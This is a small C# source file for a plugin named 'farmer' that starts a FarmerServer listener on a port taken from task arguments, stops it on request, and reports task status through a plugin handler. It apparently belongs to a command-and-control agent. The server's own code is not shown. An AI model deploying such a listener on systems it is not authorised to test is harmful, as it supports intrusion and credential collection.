﻿using PluginBase;
namespace Plugin
{
    public static class farmer
    {
        private static FarmerServer farm = new FarmerServer();

        public static void Execute(Dictionary<string, object> args)
        {

            if (!int.TryParse((string)args["port"], out Config.port))
            {
                farm.Stop();

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = (string)args["task-id"],
                    completed = "true",
                    user_output = "Stopped Farmer."
                });
            }
            else {
                Config.task_id = (string)args["task-id"];
                PluginHandler.Write($"Starting farmer on port: {Config.port}", Config.task_id, false);
                farm.Initialize(Config.port);
            }
        }
        public static void Kill(Dictionary<string, object> args)
        {
            try
            {
                farm.Stop();

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = (string)args["task-id"],
                    completed = "true",
                    user_output = "Stopped Farmer."
                });
            }
            catch (Exception e)
            {

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = (string)args["task-id"],
                    user_output = e.ToString(),
                    completed = "true",
                    status = "error",
                });
            }
        }
    }
}